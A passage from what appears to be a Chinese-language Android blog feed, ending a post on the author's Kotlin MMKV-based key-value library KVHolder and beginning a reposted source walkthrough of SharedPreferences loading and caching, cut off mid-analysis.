class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IKVHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;<span class="keyword">reified</span> T&gt;</span> IKVHolder.<span class="title">getBean</span><span class="params">(key: <span class="type">String</span>)</span></span>: T &#123;</span><br><span class="line">            <span class="keyword">return</span> JsonHolder.toBean(<span class="keyword">get</span>(key, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;<span class="keyword">reified</span> T&gt;</span> IKVHolder.<span class="title">getBeanOrNull</span><span class="params">(key: <span class="type">String</span>)</span></span>: T? &#123;</span><br><span class="line">            <span class="keyword">return</span> JsonHolder.toBeanOrNull(<span class="keyword">get</span>(key, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;<span class="keyword">reified</span> T&gt;</span> IKVHolder.<span class="title">getBeanOrDefault</span><span class="params">(key: <span class="type">String</span>, defaultValue: <span class="type">T</span>)</span></span>: T &#123;</span><br><span class="line">            <span class="keyword">return</span> JsonHolder.toBeanOrDefault(<span class="keyword">get</span>(key, <span class="string">&quot;&quot;</span>), defaultValue)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">fun</span> <span class="title">toJson</span><span class="params">(ob: <span class="type">Any</span>?)</span></span>: String &#123;</span><br><span class="line">            <span class="keyword">return</span> JsonHolder.toJson(ob)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//数据分组，用于标明不同范围内的数据缓存</span></span><br><span class="line">    <span class="keyword">val</span> keyGroup: String</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">verifyBeforePut</span><span class="params">(key: <span class="type">String</span>, value: <span class="type">Any</span>?)</span></span>: <span class="built_in">Boolean</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">get</span><span class="params">(key: <span class="type">String</span>, default: <span class="type">Int</span>)</span></span>: <span class="built_in">Int</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">set</span><span class="params">(key: <span class="type">String</span>, value: <span class="type">Int</span>)</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T&gt;</span> <span class="title">set</span><span class="params">(key: <span class="type">String</span>, value: <span class="type">T</span>?)</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">containsKey</span><span class="params">(key: <span class="type">String</span>)</span></span>: <span class="built_in">Boolean</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">removeKey</span><span class="params">(<span class="keyword">vararg</span> keys: <span class="type">String</span>)</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">allKeyValue</span><span class="params">()</span></span>: Map&lt;String, Any?&gt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line">    </span><br><span class="line">    ···</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BaseMMKVKVHolder 实现了 IKVHolder 接口，内部引入了 MMKV 作为具体的持久化存储方案</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> selfGroup 用于指定数据分组，不同分组下的数据互不关联</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> encryptKey 加密 key，如果为空则表示不进行加密</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">sealed</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseMMKVKVHolder</span> <span class="keyword">constructor</span></span>(</span><br><span class="line">    selfGroup: String,</span><br><span class="line">    encryptKey: String</span><br><span class="line">) : IKVHolder &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">override</span> <span class="keyword">val</span> keyGroup: String = selfGroup</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">verifyBeforePut</span><span class="params">(key: <span class="type">String</span>, value: <span class="type">Any</span>?)</span></span>: <span class="built_in">Boolean</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> kv: MMKV? = <span class="keyword">if</span> (encryptKey.isBlank()) MMKV.mmkvWithID(</span><br><span class="line">        keyGroup,</span><br><span class="line">        MMKV.MULTI_PROCESS_MODE</span><br><span class="line">    ) <span class="keyword">else</span> MMKV.mmkvWithID(keyGroup, MMKV.MULTI_PROCESS_MODE, encryptKey)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">set</span><span class="params">(key: <span class="type">String</span>, value: <span class="type">Int</span>)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (verifyBeforePut(key, value)) &#123;</span><br><span class="line">            kv?.putInt(key, value)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T&gt;</span> <span class="title">set</span><span class="params">(key: <span class="type">String</span>, value: <span class="type">T</span>?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (verifyBeforePut(key, value)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                removeKey(key)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">set</span>(key, toJson(value))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">get</span><span class="params">(key: <span class="type">String</span>, default: <span class="type">Int</span>)</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> kv?.getInt(key, default) ?: default</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">containsKey</span><span class="params">(key: <span class="type">String</span>)</span></span>: <span class="built_in">Boolean</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> kv?.containsKey(key) ?: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">removeKey</span><span class="params">(<span class="keyword">vararg</span> keys: <span class="type">String</span>)</span></span> &#123;</span><br><span class="line">        kv?.removeValuesForKeys(keys)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">allKeyValue</span><span class="params">()</span></span>: Map&lt;String, Any?&gt; &#123;</span><br><span class="line">        <span class="keyword">val</span> map = mutableMapOf&lt;String, Any?&gt;()</span><br><span class="line">        kv?.allKeys()?.forEach &#123;</span><br><span class="line">            map[it] = getObjectValue(kv, it)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">clear</span><span class="params">()</span></span> &#123;</span><br><span class="line">        kv?.clearAll()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">···</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseMMKVKVHolder 有两个子类，其区别只在于 MMKVKVFinalHolder 保存键值对后无法再次更改值，用于存储不会二次变更只用于历史溯源的数据，例如应用首次安装时的时间戳、版本号、版本名等</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> selfGroup 用于指定数据分组，不同分组下的数据互不关联</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> encryptKey 加密 key，如果为空则表示不进行加密</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MMKVKVHolder</span> <span class="keyword">constructor</span></span>(selfGroup: String, encryptKey: String = <span class="string">&quot;&quot;</span>) :</span><br><span class="line">    BaseMMKVKVHolder(selfGroup, encryptKey)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 存储后值无法二次变更</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> selfGroup 用于指定数据分组，不同分组下的数据互不关联</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> encryptKey 加密 key，如果为空则表示不进行加密</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MMKVKVFinalHolder</span> <span class="keyword">constructor</span></span>(selfGroup: String, encryptKey: String = <span class="string">&quot;&quot;</span>) :</span><br><span class="line">    BaseMMKVKVHolder(selfGroup, encryptKey) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">verifyBeforePut</span><span class="params">(key: <span class="type">String</span>, value: <span class="type">Any</span>?)</span></span>: <span class="built_in">Boolean</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> !containsKey(key)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过接口隔离，UserKV 就完全不会接触到具体的存储实现机制了，对于开发者来说也只是在读写 UserKV 的一个属性字段而已，当后续我们需要替换存储方案时，也只需要去改动 MMKVKVHolder 的内部实现即可，上层应用完全不需要进行任何改动</p><blockquote><p>KVHolder</p></blockquote><p>KVHolder 的实现思路还是十分简单的，再加上 Kotlin 本身强大的语法特性就进一步提高了易用性和可读性 😇😇 我也将其发布为开源库，感兴趣的读者可以直接远程导入依赖</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">allprojects &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        maven &#123; url <span class="string">&quot;https://jitpack.io&quot;</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line">    implementation <span class="string">&#x27;com.github.leavesC:KVHolder:latest_version&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GitHub 点击这里：<a href="https://link.juejin.cn/?target=https://github.com/leavesC/KVHolder" title="https://github.com/leavesC/KVHolder">KVHolder</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 轻量级缓存 SharedPreference 源码解析</title>
      <link href="/2021/10/30/Android-%E8%BD%BB%E9%87%8F%E7%BA%A7%E7%BC%93%E5%AD%98-SharedPreference-%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
      <url>/2021/10/30/Android-%E8%BD%BB%E9%87%8F%E7%BA%A7%E7%BC%93%E5%AD%98-SharedPreference-%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.jianshu.com/p/fa8cd904ed36">Android 轻量级缓存 SharedPreference 源码解析</a><br>SharedPreference 是一个 Android 开发自带的适合保存轻量级数据的 K-V 存储库，它使用了 XML 的方式来存储数据，比如我就经常用它保存一些如用户登录信息等轻量级数据。那么今天就让我们来分析一下它的源码，研究一下其内部实现。</p><h1 id="获取SharedPreferences"><a href="#获取SharedPreferences" class="headerlink" title="获取SharedPreferences"></a>获取SharedPreferences</h1><p>我们在使用 SharedPreferences 时首先是需要获取到这个 SharedPreferences 的，因此我们首先从 SharedPreferences 的获取入手，来分析其源码。</p><h1 id="根据名称获取-SP"><a href="#根据名称获取-SP" class="headerlink" title="根据名称获取 SP"></a>根据名称获取 SP</h1><p>不论是在 Activity 中调用 getPreferences() 方法还是调用 Context 的 getSharedPreferences 方法，最终都是调用到了 ContextImpl 的 getSharedPreferences(String name, int mode) 方法。我们先看看它的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public SharedPreferences getSharedPreferences(String name, int mode) &#123;</span><br><span class="line">    &#x2F;&#x2F; At least one application in the world actually passes in a null</span><br><span class="line">    &#x2F;&#x2F; name.  This happened to work because when we generated the file name</span><br><span class="line">    &#x2F;&#x2F; we would stringify it to &quot;null.xml&quot;.  Nice.</span><br><span class="line">    if (mPackageInfo.getApplicationInfo().targetSdkVersion &lt;</span><br><span class="line">            Build.VERSION_CODES.KITKAT) &#123;</span><br><span class="line">        if (name &#x3D;&#x3D; null) &#123;</span><br><span class="line">            name &#x3D; &quot;null&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    File file;</span><br><span class="line">    synchronized (ContextImpl.class) &#123;</span><br><span class="line">        if (mSharedPrefsPaths &#x3D;&#x3D; null) &#123;</span><br><span class="line">            mSharedPrefsPaths &#x3D; new ArrayMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        file &#x3D; mSharedPrefsPaths.get(name);</span><br><span class="line">        if (file &#x3D;&#x3D; null) &#123;</span><br><span class="line">            file &#x3D; getSharedPreferencesPath(name);</span><br><span class="line">            mSharedPrefsPaths.put(name, file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return getSharedPreferences(file, mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，它首先对 Android 4.4 以下的设备做了特殊处理，之后将对 mSharedPrefsPaths 的操作加了锁。mSharedPrefsPaths 的声明如下：</p><p><code>private ArrayMap&lt;String, File&gt; mSharedPrefsPaths;</code></p><p>可以看到它是一个以 name 为 key，name 对应的 File 为 value 的 HashMap。首先调用了 getSharedPreferencesPath 方法构建出了 name 对应的 File，将其放入 map 后再调用了 getSharedPreferences(File file, int mode) 方法。</p><h1 id="获取-SP-名称对应的-File-对象"><a href="#获取-SP-名称对应的-File-对象" class="headerlink" title="获取 SP 名称对应的 File 对象"></a>获取 SP 名称对应的 File 对象</h1><p>我们先看看是如何构建出 name 对应的 File 的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public File getSharedPreferencesPath(String name) &#123;</span><br><span class="line">    return makeFilename(getPreferencesDir(), name + &quot;.xml&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，调用了 makeFilename 方法来创建一个名为 name.xml 的 File。makeFilename 中仅仅是做了一些判断，之后 new 出了这个 File 对象并返回。</p><p>可以看到，SharedPreference 确实是使用 xml 来保存其中的 K-V 数据的，而具体存储的路径我们这里就不再关心了，有兴趣的可以点进去看看。</p><h1 id="根据创建的-File-对象获取-SP"><a href="#根据创建的-File-对象获取-SP" class="headerlink" title="根据创建的 File 对象获取 SP"></a>根据创建的 File 对象获取 SP</h1><p>我们接着看到获取到 File 并放入 Map 后调用的 getSharedPreferences(file, mode) 方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public SharedPreferences getSharedPreferences(File file, int mode) &#123;</span><br><span class="line">    SharedPreferencesImpl sp;</span><br><span class="line">    synchronized (ContextImpl.class) &#123;</span><br><span class="line">        final ArrayMap&lt;File, SharedPreferencesImpl&gt; cache &#x3D; getSharedPreferencesCacheLocked();  &#x2F;&#x2F; 1</span><br><span class="line">        sp &#x3D; cache.get(file);</span><br><span class="line">        if (sp &#x3D;&#x3D; null) &#123;</span><br><span class="line">            checkMode(mode);</span><br><span class="line">            if (getApplicationInfo().targetSdkVersion &gt;&#x3D; android.os.Build.VERSION_CODES.O) &#123;</span><br><span class="line">                if (isCredentialProtectedStorage()</span><br><span class="line">                        &amp;&amp; !getSystemService(UserManager.class)</span><br><span class="line">                                .isUserUnlockingOrUnlocked(UserHandle.myUserId())) &#123;</span><br><span class="line">                    throw new IllegalStateException(&quot;SharedPreferences in credential encrypted &quot;</span><br><span class="line">                            + &quot;storage are not available until after user is unlocked&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sp &#x3D; new SharedPreferencesImpl(file, mode); &#x2F;&#x2F; 2</span><br><span class="line">            cache.put(file, sp);</span><br><span class="line">            return sp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ((mode &amp; Context.MODE_MULTI_PROCESS) !&#x3D; 0 ||</span><br><span class="line">        getApplicationInfo().targetSdkVersion &lt; android.os.Build.VERSION_CODES.HONEYCOMB) &#123;</span><br><span class="line">        &#x2F;&#x2F; If somebody else (some other process) changed the prefs</span><br><span class="line">        &#x2F;&#x2F; file behind our back, we reload it.  This has been the</span><br><span class="line">        &#x2F;&#x2F; historical (if undocumented) behavior.</span><br><span class="line">        sp.startReloadIfChangedUnexpectedly();</span><br><span class="line">    &#125;</span><br><span class="line">    return sp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先可以看到注释 1 处，这里调用了 getSharedPreferencesCacheLocked 来获取到了一个 ArrayMap&lt;File, SharedPreferencesImpl&gt;，之后再从这个 Map 中尝试获取到对应的 SharedPreferencesImpl 实现类（简称 SPI)。</p><p>之后看到注释 2 处，当获取不到对应 SPI 时，再创建一个对应的 SPI，并将其加入这个 ArrayMap 中。</p><p>这里很明显是一个缓存机制的实现，以加快之后获取 SP 的速度，同时可以发现，SP 其实只是一个接口，而 SPI 才是其具体的实现类。</p><h1 id="缓存机制"><a href="#缓存机制" class="headerlink" title="缓存机制"></a>缓存机制</h1><p>那么我们先来看看其缓存机制，进入 getSharedPreferencesCacheLocked 方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">private ArrayMap&lt;File, SharedPreferencesImpl&gt; getSharedPreferencesCacheLocked() &#123;</span><br><span class="line">    if (sSharedPrefsCache &#x3D;&#x3D; null) &#123;</span><br><span class="line">        sSharedPrefsCache &#x3D; new ArrayMap&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    final String packageName &#x3D; getPackageName();</span><br><span class="line">    ArrayMap&lt;File, SharedPreferencesImpl&gt; packagePrefs &#x3D; sSharedPrefsCache.get(packageName);</span><br><span class="line">    if (packagePrefs &#x3D;&#x3D; null) &#123;</span><br><span class="line">        packagePrefs &#x3D; new ArrayMap&lt;&gt;();</span><br><span class="line">        sSharedPrefsCache.put(packageName, packagePrefs);</span><br><span class="line">    &#125;</span><br><span class="line">    return packagePrefs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然，这里有个全局的 ArrayMap：sSharedPrefsCache。</p><p>它是一个 ArrayMap&lt;String, ArrayMap&lt;File, SharedPreferencesImpl&gt;&gt; 类型的 Map，而从代码中可以看出，它是根据 PackageName 来保存不同的 SP 缓存 Map 的，通过这样的方式，就保证了不同 PackageName 中相同 name 的 SP 从缓存中拿到的数据是不同的。</p><h1 id="SharedPreferencesImpl"><a href="#SharedPreferencesImpl" class="headerlink" title="SharedPreferencesImpl"></a>SharedPreferencesImpl</h1><p>那么终于到了我们 SPI 的创建了，在 cache 中找不到对应的 SPI 时，就会 new 出一个 SPI，看看它的构造函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SharedPreferencesImpl(File file, int mode) &#123;</span><br><span class="line">    mFile &#x3D; file;</span><br><span class="line">    mBackupFile &#x3D; makeBackupFile(file); &#x2F;&#x2F; 1</span><br><span class="line">    mMode &#x3D; mode;</span><br><span class="line">    mLoaded &#x3D; false;</span><br><span class="line">    mMap &#x3D; null;</span><br><span class="line">    startLoadFromDisk();    &#x2F;&#x2F; 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到注释 1 处它调用了 makeBackupFile 来进行备份文件的创建。</p><p>之后在注释 2 处则调用了 startLoadFromDisk 来开始从 Disk 载入信息。</p><p>首先我们看看 makeBackupFile 方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static File makeBackupFile(File prefsFile) &#123;</span><br><span class="line">    return new File(prefsFile.getPath() + &quot;.bak&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单，返回了一个同目录下的后缀名为 .bak 的同名文件对象。</p><h1 id="从-Disk-加载数据"><a href="#从-Disk-加载数据" class="headerlink" title="从 Disk 加载数据"></a>从 Disk 加载数据</h1><p>接着，我们看看 startLoadFromDisk 方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">private void startLoadFromDisk() &#123;</span><br><span class="line">    synchronized (mLock) &#123;</span><br><span class="line">        mLoaded &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">    new Thread(&quot;SharedPreferencesImpl-load&quot;) &#123;</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            loadFromDisk();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，首先在加锁的情况下对 mLoaded 进行了修改，之后则开了个名为「SharedPreferencesImpl-load」的线程来加载数据。</p><p>我们看到 loadFromDisk 方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">private void loadFromDisk() &#123;</span><br><span class="line">    synchronized (mLock) &#123;  &#x2F;&#x2F; 1</span><br><span class="line">        if (mLoaded) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        if (mBackupFile.exists()) &#123;</span><br><span class="line">            mFile.delete();</span><br><span class="line">            mBackupFile.renameTo(mFile);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; Debugging</span><br><span class="line">    if (mFile.exists() &amp;&amp; !mFile.canRead()) &#123;</span><br><span class="line">        Log.w(TAG, &quot;Attempt to read preferences file &quot; + mFile + &quot; without permission&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    Map map &#x3D; null;</span><br><span class="line">    StructStat stat &#x3D; null;</span><br><span class="line">    try &#123; &#x2F;&#x2F; 2</span><br><span class="line">        stat &#x3D; Os.stat(mFile.getPath());</span><br><span class="line">        if (mFile.canRead()) &#123;</span><br><span class="line">            BufferedInputStream str &#x3D; null;</span><br><span class="line">            try &#123;</span><br><span class="line">                str &#x3D; new BufferedInputStream(</span><br><span class="line">                        new FileInputStream(mFile), 16*1024);</span><br><span class="line">                map &#x3D; XmlUtils.readMapXml(str);</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                Log.w(TAG, &quot;Cannot read &quot; + mFile.getAbsolutePath(), e);</span><br><span class="line">            &#125; finally &#123;</span><br><span class="line">                IoUtils.closeQuietly(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (ErrnoException e) &#123;</span><br><span class="line">        &#x2F;* ignore *&#x2F;</span><br><span class="line">    &#125;</span><br><span class="line">    synchronized (mLock) &#123;  &#x2F;&#x2F; 3</span><br><span class="line">        mLoaded &#x3D; true;</span><br><span class="line">        if (map !&#x3D; null) &#123;</span><br><span class="line">            mMap &#x3D; map;</span><br><span class="line">            mStatTimestamp &#x3D; stat.st_mtim;</span><br><span class="line">            mStatSize &#x3D; stat.st_size;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            mMap &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        mLock.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码比较长，我们慢慢分析</p><p>首先在注释 1 